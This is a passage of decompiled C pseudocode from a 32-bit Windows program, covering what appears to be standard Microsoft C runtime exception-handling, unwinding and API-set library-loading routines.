                                                            *(int32_t *)(v23 - 24) = v60;
                                                            *(int32_t *)(v23 - 28) = a5;
                                                            *(int32_t *)(v23 - 32) = a4;
                                                            *(int32_t *)(v23 - 36) = v25;
                                                            *(int32_t *)(v23 - 40) = a2;
                                                            *(int32_t *)(v23 - 44) = v27;
                                                            function_407c84(1, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
                                                            v19 = 1;
                                                            goto lab_0x407fba;
                                                        }
                                                        // 0x407f66
                                                        v66 = v64 - 1;
                                                        v61 = v63;
                                                    }
                                                }
                                                // 0x407f7d
                                                v19 = v53;
                                            }
                                            goto lab_0x407fba;
                                        }
                                    }
                                }
                            }
                        }
                    }
                  lab_0x407fd8:
                    // 0x407fd8
                    if (a6 != 0) {
                        // 0x407fde
                        *(int32_t *)(v23 - 4) = 1;
                        *(int32_t *)(v23 - 8) = v27;
                        function_408d2b();
                    }
                    if (v21 == 0) {
                        // 0x407fee
                        if ((*(int32_t *)a5 & 0x1fffffff) >= 0x19930521) {
                            int32_t * v67 = (int32_t *)(a5 + 28); // 0x407ffc
                            int32_t v68 = *v67; // 0x407ffc
                            char v69 = *(char *)(a5 + 32);
                            if (v68 != 0) {
                                if ((v69 & 4) != 0) {
                                    // 0x40807b
                                    function_40ae16();
                                    // UNREACHABLE
                                }
                                int32_t * v70 = (int32_t *)(v23 - 4); // 0x408014
                                *v70 = v68;
                                int32_t * v71 = (int32_t *)(v23 - 8); // 0x408017
                                *v71 = v27;
                                if ((char)function_4081e3((int32_t)&g266, (int32_t)&g266) == 0) {
                                    // 0x408080
                                    function_4078e2();
                                    function_4078e2();
                                    *(int32_t *)(function_4078e2() + 16) = v27;
                                    *(int32_t *)(function_4078e2() + 20) = v25;
                                    *v70 = v27;
                                    *v71 = a8 != 0 ? a8 : a2;
                                    function_407289((int32_t)&g266, (int32_t)&g266);
                                    int32_t * v72 = (int32_t *)(v23 - 12); // 0x4080ae
                                    *v72 = -1;
                                    *(int32_t *)(v23 - 16) = a5;
                                    *(int32_t *)(v23 - 20) = a4;
                                    *(int32_t *)(v23 - 24) = a2;
                                    function_408465();
                                    *v72 = *v67;
                                    function_407c4a();
                                    // UNREACHABLE
                                }
                            } else {
                                if (a7 == 0 && (v69 & 4) != 0) {
                                    // 0x40807b
                                    function_40ae16();
                                    // UNREACHABLE
                                }
                            }
                        }
                    }
                    goto lab_0x40804a;
                }
            }
        }
    }
  lab_0x407fc3:;
    int32_t v73 = v13 + 1; // 0x407fc3
    v14 = v73;
    v8 = v9;
    v15 = v16 + 20;
    v18 = v20;
    v10 = v11;
    v12 = v73;
    v21 = v20;
    if (v73 >= v9) {
        // break -> 0x407fd8
        goto lab_0x407fd8;
    }
    goto lab_0x407f03;
  lab_0x407fba:
    // 0x407fba
    v9 = v17;
    v20 = v19;
    v11 = v4;
    v13 = v14;
    goto lab_0x407fc3;
  lab_0x408028:
    // 0x408028
    if (*(int32_t *)(a5 + 12) != 0) {
        if (a6 != 0) {
            // 0x40807b
            function_40ae16();
            // UNREACHABLE
        }
        // 0x408032
        function_4080c8(v7, a2, v6, a4, a5, v4, a7, a8);
    }
    goto lab_0x40804a;
  lab_0x40804a:;
    int32_t result2 = function_4078e2(); // 0x40804a
    if (*(int32_t *)(result2 + 28) == 0) {
        // 0x408054
        return result2;
    }
    // 0x40807b
    function_40ae16();
    // UNREACHABLE
}

// Address range: 0x4080c8 - 0x4081e2
int32_t function_4080c8(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t result3, int32_t a7, int32_t a8) {
    int32_t * v1 = (int32_t *)a1; // 0x4080d1
    int32_t result; // 0x4080c8
    if (*v1 == -0x7ffffffd) {
        // 0x4081d8
        return result;
    }
    int32_t v2 = *(int32_t *)(function_4078e2() + 8); // 0x4080e7
    int32_t v3; // bp-24, 0x4080c8
    int32_t v4 = &v3; // 0x4080eb
    if (v2 == 0) {
        goto lab_0x408132;
    } else {
        int32_t v5 = 0; // bp-28, 0x4080ed
        int32_t v6 = &v5; // 0x4080ed
        int32_t * v7 = EncodePointer(NULL); // 0x4080ef
        int32_t v8 = *(int32_t *)(function_4078e2() + 8); // 0x4080fc
        v4 = v6;
        if (v8 == (int32_t)v7) {
            goto lab_0x408132;
        } else {
            // 0x408101
            v4 = v6;
            switch (*v1) {
                case -0x1fbcb0b3: {
                    goto lab_0x408132;
                }
                case -0x1fbcbcae: {
                    goto lab_0x408132;
                }
                default: {
                    int32_t result2 = function_407102(a1, a2, a3, a4, a5, a7); // 0x408122
                    v4 = v6;
                    if (result2 != 0) {
                        // 0x4081d8
                        return result2;
                    }
                    goto lab_0x408132;
                }
            }
        }
    }
  lab_0x4081cb:;
    // 0x4081cb
    int32_t v9; // 0x4080c8
    int32_t v10 = v9 + 1; // 0x4081cb
    int32_t v11 = v10; // bp-12, 0x4081cf
    int32_t v12; // 0x4080c8
    int32_t v13 = v12; // 0x4081d4
    int32_t v14 = v10; // 0x4081d4
    int32_t v15; // 0x4080c8
    int32_t v16 = v15; // 0x4081d4
    int32_t v17; // 0x4080c8
    int32_t v18 = v17 + 20; // 0x4081d4
    if (v10 >= v15) {
        return result3;
    }
    goto lab_0x408163;
  lab_0x408190:;
    // 0x408190
    int32_t v23; // 0x4080c8
    int32_t v26 = v23 - 16; // 0x408196
    int32_t v21; // 0x408184
    v12 = v21;
    int32_t v20; // 0x4080c8
    v9 = v20;
    int32_t v25; // 0x4080c8
    v15 = v25;
    int32_t v27; // bp-8, 0x4080c8
    int32_t * v28; // 0x40813f
    int32_t * v29; // 0x408143
    int32_t * v30; // 0x408144
    int32_t * v31; // 0x408147
    int32_t * v32; // 0x40814a
    int32_t v22; // 0x408163
    if ((*(char *)v26 & 64) == 0) {
        // 0x4081a0
        *v28 = 1;
        *v29 = a8;
        *v30 = a7;
        *v31 = v22;
        *v32 = 0;
        *(int32_t *)(v4 - 24) = v26;
        *(int32_t *)(v4 - 28) = a5;
        *(int32_t *)(v4 - 32) = a4;
        *(int32_t *)(v4 - 36) = a3;
        *(int32_t *)(v4 - 40) = a2;
        *(int32_t *)(v4 - 44) = a1;
        function_407c84((char)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        v12 = v27;
        v9 = v11;
        v15 = v27;
    }
    goto lab_0x4081cb;
  lab_0x408132:
    // 0x408132
    if (*(int32_t *)(a5 + 12) == 0) {
        // 0x4081dd
        function_40ae16();
        // UNREACHABLE
    }
    // 0x40813c
    v28 = (int32_t *)(v4 - 4);
    *v28 = (int32_t)&v27;
    v29 = (int32_t *)(v4 - 8);
    *v29 = (int32_t)&v11;
    v30 = (int32_t *)(v4 - 12);
    *v30 = result3;
    v31 = (int32_t *)(v4 - 16);
    *v31 = a7;
    v32 = (int32_t *)(v4 - 20);
    *v32 = a5;
    int32_t v33 = function_4071df((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, &g266, &g266); // 0x40814b
    result = v33;
    if (v11 >= v27) {
        // 0x4081d8
        return result;
    }
    // 0x40815d
    v13 = v27;
    v14 = v11;
    v16 = v27;
    v18 = v33 + 12;
    while (true) {
      lab_0x408163:
        // 0x408163
        v17 = v18;
        int32_t v19 = v16;
        v20 = v14;
        v21 = v13;
        v22 = v17 - 12;
        v12 = v21;
        v9 = v20;
        v15 = v19;
        if (*(int32_t *)v22 > result3) {
            goto lab_0x4081cb;
        } else {
            // 0x408168
            v12 = v21;
            v9 = v20;
            v15 = v19;
            if (*(int32_t *)(v17 - 8) < result3) {
                goto lab_0x4081cb;
            } else {
                // 0x40816d
                v23 = *(int32_t *)(v17 + 4) + 16 * *(int32_t *)v17;
                int32_t v24 = *(int32_t *)(v23 - 12); // 0x408175
                v25 = v19;
                if (v24 == 0) {
                    goto lab_0x408190;
                } else {
                    // 0x40817d
                    v25 = v21;
                    if (*(char *)(v24 + 8) != 0) {
                        goto lab_0x4081cb;
                    } else {
                        goto lab_0x408190;
                    }
                }
            }
        }
    }
    // 0x4081d8
    return result3;
}

// Address range: 0x4081e3 - 0x40827e
int32_t function_4081e3(int32_t a1, int32_t a2) {
    if (a2 == 0) {
        // 0x408279
        function_40ae16();
        // UNREACHABLE
    }
    int32_t v1 = *(int32_t *)a2; // 0x4081f7
    if (v1 < 1) {
        // 0x408270
        int32_t v2; // 0x4081e3
        return v2 & -256;
    }
    // 0x4081ff
    int32_t v3; // bp-40, 0x4081e3
    int32_t v4 = &v3; // 0x4081ee
    int32_t * v5 = (int32_t *)(a1 + 28); // 0x408207
    int32_t v6 = *(int32_t *)(*v5 + 12); // 0x40820a
    uint32_t v7 = *(int32_t *)v6; // 0x40820d
    int32_t v8 = v6 + 4; // 0x40820f
    int32_t v9 = v1; // 0x408215
    int32_t v10 = 0;
    int32_t v11 = 0;
    int32_t v12 = v10; // 0x408225
    int32_t v13; // 0x4081e3
    int32_t v14; // 0x4081e3
    int32_t v15; // 0x4081e3
    int32_t v16; // 0x408238
    int32_t v17; // 0x40824a
    if (v7 >= 1) {
        // 0x408227
        v13 = v7;
        v15 = v8;
        *(int32_t *)(v4 - 4) = *v5;
        *(int32_t *)(v4 - 8) = *(int32_t *)v15;
        *(int32_t *)(v4 - 12) = *(int32_t *)(a2 + 4) + v11;
        v16 = function_40862f(v15, v13, (int32_t)&g266);
        v12 = 1;
        while (v16 == 0) {
            // 0x408244
            v17 = v13 - 1;
            v14 = v15 + 4;
            v12 = v10;
            if (v17 >= 0 != v17 != 0) {
                // break -> 0x408262
                break;
            }
            v13 = v17;
            v15 = v14;
            *(int32_t *)(v4 - 4) = *v5;
            *(int32_t *)(v4 - 8) = *(int32_t *)v15;
            *(int32_t *)(v4 - 12) = *(int32_t *)(a2 + 4) + v11;
            v16 = function_40862f(v15, v13, (int32_t)&g266);
            v12 = 1;
        }
    }
    int32_t v18 = v12;
    v9--;
    int32_t v19 = v11 + 16; // 0x40826e
    while (v9 != 0) {
        // 0x408218
        v10 = v18;
        v11 = v19;
        v12 = v10;
        if (v7 >= 1) {
            // 0x408227
            v13 = v7;
            v15 = v8;
            *(int32_t *)(v4 - 4) = *v5;
            *(int32_t *)(v4 - 8) = *(int32_t *)v15;
            *(int32_t *)(v4 - 12) = *(int32_t *)(a2 + 4) + v11;
            v16 = function_40862f(v15, v13, (int32_t)&g266);
            v12 = 1;
            while (v16 == 0) {
                // 0x408244
                v17 = v13 - 1;
                v14 = v15 + 4;
                v12 = v10;
                if (v17 >= 0 != v17 != 0) {
                    // break -> 0x408262
                    break;
                }
                v13 = v17;
                v15 = v14;
                *(int32_t *)(v4 - 4) = *v5;
                *(int32_t *)(v4 - 8) = *(int32_t *)v15;
                *(int32_t *)(v4 - 12) = *(int32_t *)(a2 + 4) + v11;
                v16 = function_40862f(v15, v13, (int32_t)&g266);
                v12 = 1;
            }
        }
        // 0x408262
        v18 = v12;
        v9--;
        v19 = v11 + 16;
    }
    // 0x408270
    return v18 & 255 | v8 & -256;
}

// Address range: 0x40827f - 0x40828f
int32_t function_40827f(int32_t a1, int32_t a2) {
    // 0x40827f
    int32_t result; // 0x40827f
    return result;
}

// Address range: 0x40828f - 0x4082a2
int32_t function_40828f(int32_t a1, int32_t a2, int32_t a3) {
    // 0x40828f
    int32_t result; // 0x40828f
    return result;
}

// Address range: 0x4082a2 - 0x408324
int32_t function_4082a2(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8) {
    // 0x4082a2
    function_406cf0(&g81, 8, (int32_t)&g266);
    int32_t v1; // 0x4082a2
    int32_t v2 = *(int32_t *)(v1 + 16); // 0x4082ae
    int32_t v3 = *(int32_t *)(v1 + 12); // 0x4082b1
    int32_t v4 = v3; // 0x4082b7
    if (*(int32_t *)v2 >= 0) {
        // 0x4082bd
        v4 = v3 + 12 + *(int32_t *)(v2 + 8);
    }
    int32_t * v5 = (int32_t *)(v1 - 4); // 0x4082c3
    *v5 = 0;
    int32_t v6 = *(int32_t *)(v1 + 20); // 0x4082c7
    int32_t v7 = *(int32_t *)(v1 + 8); // 0x4082cd
    int32_t v8 = function_408331(v7, v3, v2, v6) - 1; // 0x4082d9
    int32_t result; // 0x40831e
    if (v8 == 0) {
        // 0x4082ff
        function_408df4(*(int32_t *)(v7 + 24), v6 + 8);
        // 0x408317
        *v5 = -2;
        result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        return result;
    }
    if (v8 == 1) {
        int32_t v9 = function_408df4(*(int32_t *)(v7 + 24), v6 + 8); // 0x4082ec
        function_40828f(v4, *(int32_t *)(v6 + 24), v9);
    }
    // 0x408317
    *v5 = -2;
    result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
    return result;
}

// Address range: 0x408324 - 0x408328
int32_t function_408324(void) {
    // 0x408324
    return 1;
}

// Address range: 0x408331 - 0x408464
int32_t function_408331(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x408331
    function_406cf0(&g84, 16, (int32_t)&g266);
    int32_t v1; // 0x408331
    int32_t v2 = *(int32_t *)(v1 + 16); // 0x40833f
    int32_t v3 = *(int32_t *)(v2 + 4); // 0x408342
    int32_t result; // 0x408459
    if (v3 == 0 || *(char *)(v3 + 8) == 0) {
        // 0x408459
        result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        return result;
    }
    int32_t v4 = *(int32_t *)(v2 + 8); // 0x408356
    int32_t v5 = *(int32_t *)v2;
    if (v4 == 0 && v5 >= 0) {
        // 0x408459
        result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        return result;
    }
    int32_t v6 = (v5 < 0 ? 0 : v4 + 12) + *(int32_t *)(v1 + 12);
    int32_t * v7 = (int32_t *)(v1 - 4); // 0x408373
    *v7 = 0;
    int32_t v8 = *(int32_t *)(v1 + 20); // 0x408376
    int32_t v9; // 0x408331
    if ((char)v5 >= 0) {
        goto lab_0x40839d;
    } else {
        // 0x40837d
        if ((*(char *)v8 & 16) == 0) {
            goto lab_0x40839d;
        } else {
            // 0x408382
            *(int32_t *)(v1 - 28) = g184;
            if (g184 == 0) {
                goto lab_0x40839d;
            } else {
                // 0x40838e
                v9 = function_406b3d();
                goto lab_0x4083a8;
            }
        }
    }
  lab_0x40839d:;
    int32_t v10 = *(int32_t *)(v1 + 8); // 0x40839d
    int32_t * v11; // 0x408331
    int32_t v12; // 0x408331
    if ((v5 & 8) == 0) {
        char v13 = *(char *)v8; // 0x4083c1
        int32_t v14 = *(int32_t *)(v10 + 24);
        if ((v13 & 1) == 0) {
            bool v15 = v6 == 0 | v14 == 0;
            if (*(int32_t *)(v8 + 24) != 0) {
                if (v15) {
                    // 0x40845f
                    function_40ae16();
                    // UNREACHABLE
                }
                // 0x408436
                *(int32_t *)(v1 - 32) = (v13 & 4) != 0 ? 2 : 1;
            } else {
                if (v15) {
                    // 0x40845f
                    function_40ae16();
                    // UNREACHABLE
                }
                int32_t v16 = function_408df4(v14, v8 + 8); // 0x40841b
                function_408e60(v6, v16, (int32_t)&g266);
            }
            // 0x408443
            *v7 = -2;
            // 0x408459
            result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
            return result;
        }
        if (v6 == 0 || v14 == 0) {
            // 0x40845f
            function_40ae16();
            // UNREACHABLE
        }
        int32_t * v17 = (int32_t *)(v8 + 20); // 0x4083d8
        function_408e60(v6, v14, *v17);
        if (*v17 != 4) {
            // 0x408443
            *v7 = -2;
            // 0x408459
            result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
            return result;
        }
        int32_t * v18 = (int32_t *)v6;
        int32_t v19 = *v18; // 0x4083ed
        v11 = v18;
        v12 = v19;
        if (v19 == 0) {
            // 0x408443
            *v7 = -2;
            // 0x408459
            result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
            return result;
        }
        goto lab_0x4083f8;
    } else {
        // 0x4083a5
        v9 = *(int32_t *)(v10 + 24);
        goto lab_0x4083a8;
    }
  lab_0x4083f8:
    // 0x4083f8
    *v11 = function_408df4(v12, v8 + 8);
    // 0x408443
    *v7 = -2;
    // 0x408459
    result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
    return result;
  lab_0x4083a8:
    // 0x4083a8
    if (v6 == 0 || v9 == 0) {
        // 0x40845f
        function_40ae16();
        // UNREACHABLE
    }
    int32_t * v20 = (int32_t *)v6;
    *v20 = v9;
    v11 = v20;
    v12 = v9;
    goto lab_0x4083f8;
}

// Address range: 0x408465 - 0x408531
int32_t function_408465(void) {
    int32_t v1 = &g82; // bp-8, 0x408467
    function_406cf0(&g82, 16, (int32_t)&g266);
    int32_t v2; // 0x408465
    int32_t * v3 = (int32_t *)(v2 + 8); // 0x408471
    int32_t * v4 = (int32_t *)(v2 + 16); // 0x408474
    int32_t v5 = *v3 + 8;
    int32_t v6; // 0x408465
    if (*(int32_t *)(*v4 + 4) > 128) {
        // 0x408486
        v6 = *(int32_t *)v5;
    } else {
        // 0x408480
        v6 = (int32_t)*(char *)v5;
    }
    int32_t * v7 = (int32_t *)(v2 - 28); // 0x408489
    *v7 = v6;
    int32_t * v8 = (int32_t *)(function_4078e2() + 24); // 0x408491
    *v8 = *v8 + 1;
    int32_t * v9 = (int32_t *)(v2 - 4); // 0x408494
    *v9 = 0;
    int32_t * v10 = (int32_t *)(v2 + 20); // 0x408498
    int32_t v11 = v6; // 0x40849b
    if (v6 == *v10) {
      lab_0x4084f8:
        // 0x4084f8
        *v9 = -2;
        function_408518();
        if (v11 != *v10) {
            // 0x40852c
            function_40ae16();
            // UNREACHABLE
        }
        // 0x408509
        *(int32_t *)(*v3 + 8) = v11;
        int32_t result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x40850f
        return result;
    }
    int32_t * v12 = (int32_t *)(v2 - 32);
    int32_t v13 = v6; // 0x4084f0
    int32_t v14 = &v1; // 0x4084d4
    while (v13 >= 0) {
        int32_t v15 = *v4; // 0x4084a6
        if (v13 >= *(int32_t *)(v15 + 4)) {
            // break -> 0x40852c
            break;
        }
        int32_t v16 = v14;
        int32_t * v17 = (int32_t *)(v15 + 8); // 0x4084ae
        int32_t v18 = *v17; // 0x4084ae
        int32_t v19 = 8 * v13; // 0x4084b1
        int32_t v20 = *(int32_t *)(v18 + v19); // 0x4084b1
        *v12 = v20;
        *v9 = 1;
        int32_t v21 = v19 | 4;
        v14 = v16;
        if (*(int32_t *)(v18 + v21) != 0) {
            int32_t v22 = *v3; // 0x4084c5
            *(int32_t *)(v22 + 8) = v20;
            *(int32_t *)(v16 - 4) = 259;
            *(int32_t *)(v16 - 8) = v22;
            v14 = v16 - 12;
            *(int32_t *)v14 = *(int32_t *)(*v17 + v21);
            function_4079f0((int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        }
        // 0x4084ec
        *v9 = 0;
        v13 = *v12;
        *v7 = v13;
        v11 = v13;
        if (v13 == *v10) {
            goto lab_0x4084f8;
        }
    }
    // 0x40852c
    function_40ae16();
    // UNREACHABLE
}

// Address range: 0x408518 - 0x40852c
int32_t function_408518(void) {
    int32_t v1 = function_4078e2(); // 0x408518
    int32_t result = v1; // 0x408521
    if (*(int32_t *)(v1 + 24) >= 1) {
        // 0x408523
        result = function_4078e2();
        int32_t * v2 = (int32_t *)(result + 24); // 0x408528
        *v2 = *v2 - 1;
    }
    // 0x40852b
    return result;
}

// Address range: 0x408532 - 0x40862f
int32_t function_408532(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8) {
    // 0x408532
    function_4086bd(a3);
    if (*(int32_t *)(function_4078e2() + 32) != 0) {
        goto lab_0x40857f;
    } else {
        // 0x40855d
        switch (*(int32_t *)a1) {
            case -0x1f928c9d: {
                goto lab_0x40857f;
            }
            case -0x7fffffda: {
                goto lab_0x40857f;
            }
            default: {
                // 0x40856d
                if ((*(int32_t *)a5 & 0x1ffffffe) >= 0x19930522) {
                    // 0x408575
                    if ((*(char *)(a5 + 32) & 1) != 0) {
                        // 0x40862a
                        return 1;
                    }
                }
                goto lab_0x40857f;
            }
        }
    }
  lab_0x40857f:
    // 0x40857f
    if ((*(char *)(a1 + 4) & 102) != 0) {
        // 0x408585
        if (!((a6 != 0 | *(int32_t *)(a5 + 4) == 0))) {
            // 0x408597
            function_408465();
        }
        // 0x40862a
        return 1;
    }
    // 0x4085aa
    if (*(int32_t *)(a5 + 12) == 0) {
        uint32_t v1 = *(int32_t *)a5 & 0x1fffffff; // 0x4085b1
        if (v1 < 0x19930521) {
            // 0x40862a
            return 1;
        }
        // 0x4085ba
        if (*(int32_t *)(a5 + 28) == 0) {
            // 0x4085bf
            if (v1 < 0x19930522 || (*(char *)(a5 + 32) & 4) == 0) {
                // 0x40862a
                return 1;
            }
        }
    }
    // 0x4085c9
    if (*(int32_t *)a1 != -0x1f928c9d || *(int32_t *)(a1 + 16) < 3 || *(int32_t *)(a1 + 20) <= 0x19930522) {
        // 0x40860b
        function_407d47(a1, a2, a3, a4, a5, (char)a8, a6, a7);
        // 0x40862a
        return 1;
    }
    // 0x4085dc
    if (*(int32_t *)(*(int32_t *)(a1 + 28) + 8) != 0) {
        // 0x40862a
        return function_406b3d();
    }
    // 0x40860b
    function_407d47(a1, a2, a3, a4, a5, (char)a8, a6, a7);
    // 0x40862a
    return 1;
}

// Address range: 0x40862f - 0x4086bd
int32_t function_40862f(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = *(int32_t *)(a1 + 4); // 0x408638
    if (v1 == 0) {
        // 0x4086b8
        return 1;
    }
    int32_t v2 = v1 + 8; // 0x40863f
    char v3 = *(char *)v2; // 0x408642
    if (v3 == 0) {
        // 0x4086b8
        return 1;
    }
    unsigned char v4 = *(char *)a1; // 0x408647
    if (v4 <= 255) {
        // 0x40864f
        if ((*(char *)a2 & 16) != 0) {
            // 0x4086b8
            return 1;
        }
    }
    int32_t v5 = *(int32_t *)(a2 + 4); // 0x408654
    if (v1 != v5) {
        int32_t v6 = v5 + 8; // 0x40865d
        int32_t v7 = v2; // 0x408664
        int32_t v8 = v6; // 0x408664
        if (v3 != *(char *)v6) {
            // 0x4086b8
            return 0;
        }
        char v9 = v3; // 0x408664
        while (v9 != 0) {
            char v10 = *(char *)(v7 + 1); // 0x40866a
            if (v10 != *(char *)(v8 + 1)) {
                // 0x4086b8
                return 0;
            }
            if (v10 == 0) {
                // break -> 0x40868d
                break;
            }
            // 0x408672
            v7 += 2;
            v8 += 2;
            v9 = *(char *)v7;
            if (v9 != *(char *)v8) {
                // 0x4086b8
                return 0;
            }
        }
    }
    // 0x40868d
    if ((v4 & 8) == 0 == ((*(char *)a2 & 2) != 0)) {
        // 0x4086b8
        return 0;
    }
    char v11 = *(char *)a3; // 0x40869a
    if ((v4 & 1) == 0 != (v11 & 1) != 0) {
        // 0x4086a4
        return (v4 & 2) != 0 | (v11 & 2) == 0;
    }
    // 0x4086b8
    return 0;
}

// Address range: 0x4086bd - 0x4086ed
int32_t function_4086bd(int32_t a1) {
    // 0x4086bd
    return 0x406b3d;
}

// Address range: 0x4086ed - 0x40871a
int32_t function_4086ed(int32_t a1, int32_t a2) {
    // 0x4086ed
    return 0x406b3d;
}

// Address range: 0x40871a - 0x408756
int32_t function_40871a(void) {
    // 0x408723
    int32_t v1; // bp-8, 0x40871a
    int32_t v2 = &v1; // 0x40871b
    *(int32_t *)(v2 - 4) = 0;
    *(int32_t *)(v2 - 8) = 4000;
    *(int32_t *)(v2 - 12) = (int32_t)&g179;
    int32_t v3 = function_4089a9((int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x40872b
    int32_t result; // 0x40871a
    if (v3 == 0) {
        // 0x40874c
        result = function_408756() & -256;
    } else {
        // 0x408748
        g180 = (int32_t)g180 + 1;
        result = v3 & -256 | 1;
    }
    // 0x408753
    return result;
}

// Address range: 0x408756 - 0x408785
int32_t function_408756(void) {
    int32_t v1 = g180; // 0x408757
    if (v1 == 0) {
        // 0x408781
        int32_t v2; // 0x408756
        return v2 & -256 | 1;
    }
    // 0x408761
    int32_t v3; // bp-8, 0x408756
    int32_t v4 = &v3; // 0x408765
    int32_t v5 = v1; // 0x408765
    int32_t v6 = 24 * v1 + (int32_t)&g178; // 0x408765
    v4 -= 4;
    *(int32_t *)v4 = v6;
    DeleteCriticalSection((struct _RTL_CRITICAL_SECTION *)&g266);
    g180 = (int32_t)g180 - 1;
    v5--;
    v6 -= 24;
    while (v5 != 0) {
        // 0x40876b
        v4 -= 4;
        *(int32_t *)v4 = v6;
        DeleteCriticalSection((struct _RTL_CRITICAL_SECTION *)&g266);
        g180 = (int32_t)g180 - 1;
        v5--;
        v6 -= 24;
    }
    // 0x408781
    return (int32_t)&g266 & -256 | 1;
}

// Address range: 0x408785 - 0x40884b
int32_t function_408785(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    int32_t result = 0; // 0x408838
    if (a1 == a2) {
        // 0x408840
        return result;
    }
    int32_t v1 = a1; // 0x408832
    int32_t v2; // bp-20, 0x408785
    int32_t v3 = &v2; // 0x408785
    int32_t v4; // 0x408785
    int32_t v5; // 0x408785
    int32_t v6; // 0x408785
    int32_t * v7; // 0x40879d
    while (true) {
      lab_0x408794:;
        int32_t v8 = v3;
        int32_t v9 = 4 * *(int32_t *)v1; // 0x408796
        int32_t lpLibFileName = v9 + (int32_t)&g181; // 0x408796
        v7 = (int32_t *)lpLibFileName;
        int32_t v10 = *v7; // 0x40879d
        v3 = v8;
        result = v10;
        switch (v10) {
            case 0: {
                int32_t v11 = *(int32_t *)(v9 + (int32_t)&g24); // 0x4087b1
                *(int32_t *)(v8 - 4) = 2048;
                *(int32_t *)(v8 - 8) = 0;
                int32_t v12 = v8 - 12; // 0x4087bf
                *(int32_t *)v12 = v11;
                int32_t * v13 = LoadLibraryExW((int16_t *)lpLibFileName, &g266, (int32_t)&g266); // 0x4087c0
                int32_t v14 = (int32_t)v13; // 0x4087c0
                v6 = v12;
                v4 = v14;
                if (v13 != NULL) {
                    goto lab_0x40881c;
                } else {
                    // 0x4087cc
                    v5 = v12;
                    if (GetLastError() != 87) {
                        goto lab_0x408812;
                    } else {
                        int32_t * v15 = (int32_t *)(v8 - 16); // 0x4087d7
                        *v15 = 7;
                        int32_t * v16 = (int32_t *)(v8 - 20); // 0x4087d9
                        *v16 = (int32_t)L"api-ms-";
                        int32_t v17 = v8 - 24; // 0x4087de
                        int32_t * v18 = (int32_t *)v17; // 0x4087de
                        *v18 = v11;
                        int32_t v19 = function_40af59((int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x4087df
                        v5 = v12;
                        if (v19 == 0) {
                            goto lab_0x408812;
                        } else {
                            // 0x4087eb
                            *v15 = 7;
                            *v16 = (int32_t)L"ext-ms-";
                            *v18 = v11;
                            int32_t v20 = function_40af59((int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x4087f3
                            v5 = v12;
                            if (v20 == 0) {
                                goto lab_0x408812;
                            } else {
                                // 0x40880e
                                *v15 = v14;
                                *v16 = v14;
                                *v18 = v11;
                                int32_t * v21 = LoadLibraryExW((int16_t *)&g266, &g266, (int32_t)&g266); // 0x408802
                                v5 = v17;
                                v6 = v17;
                                v4 = (int32_t)v21;
                                if (v21 != NULL) {
                                    goto lab_0x40881c;
                                } else {
                                    goto lab_0x408812;
                                }
                            }
                        }
                    }
                }
            }
            case -1: {
                goto lab_0x408832;
            }
            default: {
                return result;
            }
        }
    }
  lab_0x408840_3:
    // 0x408840
    return result;
  lab_0x408832:
    // 0x408832
    v1 += 4;
    result = 0;
    if (v1 == a2) {
        return result;
    }
    goto lab_0x408794;
  lab_0x40881c:;
    int32_t v22 = v4;
    int32_t v23 = v6;
    *v7 = v22;
    int32_t v24 = v23; // 0x408825
    if (*v7 != 0) {
        int32_t v25 = v23 - 4; // 0x408827
        *(int32_t *)v25 = v22;
        FreeLibrary(&g266);
        v24 = v25;
    }
    // 0x40882e
    v3 = v24;
    result = v22;
    if (v22 != 0) {
        // break -> 0x408840
        goto lab_0x408840_3;
    }
    goto lab_0x408832;
  lab_0x408812:
    // 0x408812
    *v7 = -1;
    v3 = v5;
    goto lab_0x408832;
}

// Address range: 0x40884b - 0x4088ba
int32_t function_40884b(int32_t a1, char * lpProcName, int32_t * a3, char * a4, int32_t a5, int32_t a6) {
    int32_t * v1 = (int32_t *)(4 * a1 + (int32_t)&g182); // 0x408859
    uint32_t v2 = g112 & 31; // 0x408863
    int32_t v3 = g112 ^ *v1; // 0x408866
    int32_t result = v3; // 0x408868
    if (v2 != 0) {
        result = v3 << 32 - v2 | v3 >> v2;
    }
    if (result == -1) {
        // 0x4088b7
        return 0;
    }
    // 0x408873
    if (result != 0) {
        // 0x4088b7
        return result;
    }
    int32_t v4 = (int32_t)a3;
    int32_t v5 = v4; // bp-20, 0x40887f
    int32_t v6; // 0x40884b
    int32_t v7; // 0x40884b
    int32_t v8; // 0x40884b
    int32_t hModule = function_408785(v4, (int32_t)a4, v7, v6, v8); // 0x408882
    int32_t v9; // bp-12, 0x40884b
